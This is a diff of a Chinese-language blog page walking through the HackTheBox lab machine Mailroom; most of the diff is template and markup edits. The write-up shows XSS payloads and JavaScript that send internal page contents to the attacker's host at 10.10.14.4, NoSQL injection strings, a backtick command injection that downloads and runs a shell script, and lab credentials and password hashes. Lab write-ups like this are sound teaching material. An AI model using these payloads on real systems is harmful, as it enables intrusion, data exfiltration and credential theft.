@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Mailroom 10.10.11.209                                                                                                              端口扫描22和80: 12345678910111213">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Mailroom 10.10.11.209   端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.209Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-04-17 15:01 CSTNma">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Mailroom - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2023/04/19/Mailroom-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Mailroom 10.10.11.209                                                                                                              端口扫描22和80: 12345678910111213">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Mailroom 10.10.11.209   端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.209Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-04-17 15:01 CSTNma">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041701.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041702.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041705.jpg">
@@ -132,8 +132,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -155,7 +162,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -222,232 +229,76 @@
 <li><a href="https://app.hackthebox.com/machines/Mailroom" target="_blank" rel="noopener">https://app.hackthebox.com/machines/Mailroom</a></li>
 <li>10.10.11.209</li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041701.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041701.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.209</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 15:01 CST</span><br><span class="line">Nmap scan report for 10.10.11.209</span><br><span class="line">Host is up (0.096s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 94bb2ffcaeb9b182afd789811aa76ce5 (RSA)</span><br><span class="line">|   256 821beb758b9630cf946e7957d9ddeca7 (ECDSA)</span><br><span class="line">|_  256 19fb45feb9e4275de5bbf35497dd68cf (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.54 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.54 (Debian)</span><br><span class="line">|_http-title: The Mail Room</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 35.10 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>物流服务,页面底部可以得到域名 <code>mailroom.htb</code>：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041702.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041702.jpg" alt=""></p>
 <h1 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h1><p>添加hosts后扫描子域名,得到git：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.209 mailroom.htb</span><br><span class="line"></span><br><span class="line">ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://mailroom.htb/" -H 'Host: FUZZ.mailroom.htb' -fs 0,7748</span><br><span class="line"></span><br><span class="line">[Status: 200, Size: 13201, Words: 1009, Lines: 268, Duration: 117ms]</span><br><span class="line">    * FUZZ: git</span><br></pre></td></tr></table></figure>
 
 <h2 id="git-mailroom-htb"><a href="#git-mailroom-htb" class="headerlink" title="git.mailroom.htb"></a>git.mailroom.htb</h2><p>同样添加hosts后访问,是一个gitea：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041705.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041705.jpg" alt=""></p>
 <h1 id="gitea"><a href="#gitea" class="headerlink" title="gitea"></a>gitea</h1><p>没开注册，但探索里能直接访问一个repo：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041706.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041706.jpg" alt=""></p>
 <h2 id="auth-php"><a href="#auth-php" class="headerlink" title="auth.php"></a>auth.php</h2><p>查看代码，auth里可以知道用了mongo，并且得到另一个开了2FA的子域名：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$client = <span class="keyword">new</span> MongoDB\Client(<span class="string">"mongodb://mongodb:27017"</span>); <span class="comment">// Connect to the MongoDB database</span></span><br><span class="line"></span><br><span class="line">$message = <span class="string">'Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token='</span> . $token;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041707.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041707.jpg" alt=""></p>
 <h2 id="staff-review-panel"><a href="#staff-review-panel" class="headerlink" title="staff-review-panel"></a>staff-review-panel</h2><p>添加hosts尝试外部访问，403：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041708.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041708.jpg" alt=""></p>
 <h2 id="inspect-php"><a href="#inspect-php" class="headerlink" title="inspect.php"></a>inspect.php</h2><p>查看inspect.php发现直接使用shell_exec,对可控的inquiry_id存在一些过滤，但注意没有过滤掉反引号：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041711.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041711.jpg" alt=""></p>
 <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>简单测试功能，发现contact存在XSS：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041703.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041704.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041703.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041704.jpg" alt=""></p>
 <h2 id="staff-review-panel-1"><a href="#staff-review-panel-1" class="headerlink" title="staff-review-panel"></a>staff-review-panel</h2><p>那就可以尝试通过XSS让管理员去访问staff-review-panel，把结果发送给我们：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email&#x3D;miao%40miao.com&amp;title&#x3D;miao&amp;message&#x3D;&lt;script+src%3d&quot;http%3a&#x2F;&#x2F;10.10.14.4&#x2F;miao.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041709.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041709.jpg" alt=""></p>
 <p>但还是需要登录的：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041710.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041710.jpg" alt=""></p>
 <h2 id="nosql注入"><a href="#nosql注入" class="headerlink" title="nosql注入"></a>nosql注入</h2><p>利用XSS去打auth.php尝试进行nosql注入,但注入成功后提示2FA在邮件里，所以还是要一步步来最终得到账号密码:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">email[$ne]&#x3D;1&amp;password[$ne]&#x3D;1</span><br><span class="line">email[$regex]&#x3D;^t&amp;password[$ne]&#x3D;1</span><br><span class="line">email&#x3D;tristan@mailroom.htb&amp;password[$regex]&#x3D;^6</span><br><span class="line"></span><br><span class="line">tristan </span><br><span class="line">69trisRulez!</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041721.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041722.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041721.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041722.jpg" alt=""></p>
 <h2 id="miao-js"><a href="#miao-js" class="headerlink" title="miao.js"></a>miao.js</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">"http://staff-review-panel.mailroom.htb/index.php"</span>;</span><br><span class="line"><span class="keyword">var</span> attacker = <span class="string">"http://10.10.14.4/out"</span>;</span><br><span class="line"><span class="keyword">var</span> xhr  = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState == XMLHttpRequest.DONE) &#123;</span><br><span class="line">        fetch(attacker + <span class="string">"?"</span> + <span class="built_in">encodeURI</span>(btoa(xhr.responseText)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xhr.open(<span class="string">'GET'</span>, url, <span class="literal">true</span>);</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
 
 <h2 id="auth-js"><a href="#auth-js" class="headerlink" title="auth.js"></a>auth.js</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">"http://staff-review-panel.mailroom.htb/auth.php"</span>;</span><br><span class="line"><span class="keyword">var</span> attacker = <span class="string">"http://10.10.14.4/out"</span>;</span><br><span class="line"><span class="keyword">var</span> xhr  = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.readyState == XMLHttpRequest.DONE) &#123;</span><br><span class="line">    fetch(attacker + <span class="string">"?"</span> + <span class="built_in">encodeURI</span>(btoa(xhr.responseText)));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">xhr.open(<span class="string">'POST'</span>, url);</span><br><span class="line">xhr.setRequestHeader(<span class="string">'Content-type'</span>, <span class="string">'application/x-www-form-urlencoded'</span>);</span><br><span class="line">xhr.send(<span class="string">'email[$ne]=1&amp;password[$ne]=1'</span>);</span><br></pre></td></tr></table></figure>
 
 <h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p>得到的账号密码可以ssh登录，但还没到user，但已经可以读邮件获取staff-review-panel认证链接：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041723.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041723.jpg" alt=""></p>
 <p>转发本地80端口出来，使用邮件里的2FA链接访问认证后的staff-review-panel，利用inspect.php的命令注入，得到www-data shell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh tristan@10.10.11.209 -L 80:127.0.0.1:80</span><br><span class="line"></span><br><span class="line">inquiry_id&#x3D;&#96;curl 10.10.14.4&#x2F;shell -o &#x2F;tmp&#x2F;shell&#96;</span><br><span class="line">inquiry_id&#x3D;&#96;bash &#x2F;tmp&#x2F;shell&#96;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041724.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041725.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041712.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041724.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041725.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041712.jpg" alt=""></p>
 <p>git config里得到matthew账号密码,但并不能直接ssh登录：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url &#x3D; http:&#x2F;&#x2F;matthew:HueLover83%23@gitea:3000&#x2F;matthew&#x2F;staffroom.git</span><br><span class="line">	</span><br><span class="line">HueLover83#</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041713.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041713.jpg" alt=""></p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>tristan用户SSH session里，使用得到的matthew账号密码su切过去，得到user flag:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">matthew</span><br><span class="line">HueLover83#</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041714.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041714.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>matthew用户目录里发现trista有读权限的personal.kdbx，下载到本地：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp tristan@10.10.11.209:/home/matthew/personal.kdbx .</span><br></pre></td></tr></table></figure>
 
 <p>运行pspy64,发现kpcli,直接strace去获取信息，操作要非常快，根据read中得到的字符还原得到keepass密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.4:7777/pspy64</span><br><span class="line">chmod +x ./pspy64</span><br><span class="line">./pspy64</span><br><span class="line"></span><br><span class="line">strace -e read -p pid</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> \010 is a del character</span></span><br><span class="line">!sEcUr3p4$$w0rd9</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041718.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041718.jpg" alt=""></p>
 <h2 id="keepass"><a href="#keepass" class="headerlink" title="keepass"></a>keepass</h2><p>使用得到的密码打开kdbx文件，得到root密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># keepass</span><br><span class="line"># \010 is a del character</span><br><span class="line">!sEcUr3p4$$w0rd9</span><br><span class="line"></span><br><span class="line"># root pass</span><br><span class="line">a$gBa3!GA8</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041719.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041719.jpg" alt=""></p>
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>使用得到的密码su切到root：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041720.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041720.jpg" alt=""></p>
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$6$eSs&#x2F;sq0j1FH6EyFi$UJKfsByoNiJoacmC6Ko44cOPuLRn3vX6KfsFDtqCo7EvRYN0mnPMZkDrENFLYZPppr3SsK7K5cHtgTaEu&#x2F;4ZE.:19430:0:99999:7:::</span><br><span class="line">tristan:$6$VcPf8uXhQ1WTXpJp$vn02AxnM7Memo7.SMnM9r.P3vRw93O15zzpFuSwQaIjOkilBYTdo2H&#x2F;URHyBXVz0tBYZuR4Salj7GueyPHvvA&#x2F;:19372:0:99999:7:::</span><br><span class="line">matthew:$6$2zFwPXOaAMBhFYSV$TaNzocDMNPZ6FIm7C3Egt7bJszN2CwaUrnrDyczRC.hc75cyoMhFH&#x2F;E3De4H2MrhCDQIJB4UrhNyj8WcnvCvf.:19372:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 
@@ -465,7 +316,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2023-08-21T01:35:00.281Z" itemprop="dateUpdated">2023-08-21 09:35:00</time>
+    Last updated: <time datetime="2023-08-21T01:35:00.281Z" itemprop="dateUpdated">2023-08-21 09:35:00</time>
 </span><br>
 
 
@@ -632,11 +483,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
